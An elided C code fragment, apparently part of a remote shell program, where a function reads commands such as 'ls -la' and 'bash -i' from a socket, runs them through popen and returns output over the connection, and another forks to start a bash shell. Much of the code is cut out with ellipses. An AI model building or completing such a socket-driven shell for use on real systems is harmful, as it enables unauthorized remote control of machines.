...
void shell(int sockfd) {
    ...
    setenv("TERM", "xterm", 1); // Set TERM to xterm or any other terminal type you prefer
    ...
    while (1) {
        ...
        if (n > 0) {
            ...
            if (strcmp(buffer, "ls -la\n") == 0) {
                ...
                pclose(fp);
            } else if (strcmp(buffer, "bash -i\n") == 0) {
                // Start an interactive bash shell with job control
                FILE *fp = popen("bash -i", "r");
                if (fp == NULL) {
                    char error[] = "Failed to run command\n";
                    write(sockfd, error, strlen(error));
                    continue;
...
void action(int sockfd) {
    ...
    if ((pid = fork()) == 0) {
        ...
        // Start a bash shell with job control
